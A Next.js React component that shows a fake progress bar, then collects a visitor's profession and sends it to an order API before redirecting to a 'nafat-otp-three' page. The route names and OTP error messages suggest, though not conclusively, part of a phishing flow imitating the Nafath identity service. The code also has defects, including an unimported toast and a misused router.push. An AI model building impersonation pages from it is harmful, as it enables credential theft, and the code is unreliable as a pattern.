import { useRouter, useSearchParams } from "next/navigation";

import { FaArrowRightLong } from "react-icons/fa6";
import SwiperSlider from "@/components/SwiperSlider";
import { useEffect, useState } from "react";
import { Button, CircularProgress } from "@nextui-org/react";

const Profession = () => {
  const router = useRouter();
  const searchParams = useSearchParams();
  const params = new URLSearchParams(searchParams);
  const [value, setValue] = useState(0);

  const handleSubmit = (e) => {
    e.preventDefault();
    const submitData = {
      profession: e.target.profession.value,
    };

    if (submitData.profession === "") {
      toast.error("Please enter your profession");
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(`${process.env.API_URL}/api/order/${params.get("id")}`, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          if (data) {
            router.push({
              pathname: "/nafat-otp-three",
              query: { id: params.get("id") },
            });
          } else {
            toast.error("Please enter correct otp");
          }
        })
        .catch((err) => {
          alert(`Please enter correct otp ~ ${err}`);
        });
    }
  };

  useEffect(() => {
    const interval = setInterval(() => {
      setValue((v) => {
        if (v >= 100) {
          clearInterval(interval);
          return 100; // Stop at 100%
        }
        return v + 1;
      });
    }, 150); // 1200 milliseconds = 1.2 seconds

    return () => clearInterval(interval);
  }, []);

  return (
    <>
      <SwiperSlider />
      <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
        <h1 className="text-4xl font-bold text-gray-600 mt-10">Profession</h1>

        {value < 100 ? (
          <>
            <CircularProgress
              classNames={{
                svg: "w-36 h-36 drop-shadow-md",
                indicator: "stroke-[#0D9488]",
                track: "#0D9488",
                value: "text-3xl font-semibold text-gray-700",
              }}
              value={value}
              strokeWidth={4}
              showValueLabel={true}
            />
            <h3 className="text-xl font-bold text-gray-600 mt-10">
              Please wait for the process to be completed...
            </h3>
          </>
        ) : (
          <form onSubmit={handleSubmit} className="w-3/4 my-14">
            <div className="relative z-0 w-full mb-6 group">
              <input
                type="text"
                name="profession"
                id="profession"
                className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
                placeholder=""
                required
              />
              <label
                htmlFor="profession"
                className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
              >
                Enter about your profession
              </label>
            </div>
            {/* <button
              type="submit"
              className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
            >
              Continue to nafat otp three <FaArrowRightLong size={16} />
            </button> */}
            <Button
              color="primary"
              type="submit"
              className={`w-full text-white h-12 bg-[#0D9488]`}
            >
              Submit Profession <FaArrowRightLong size={16} />
            </Button>
          </form>
        )}
      </div>
      <div className="h-20 bg-teal-400 mt-5" />
    </>
  );
};

export default Profession;
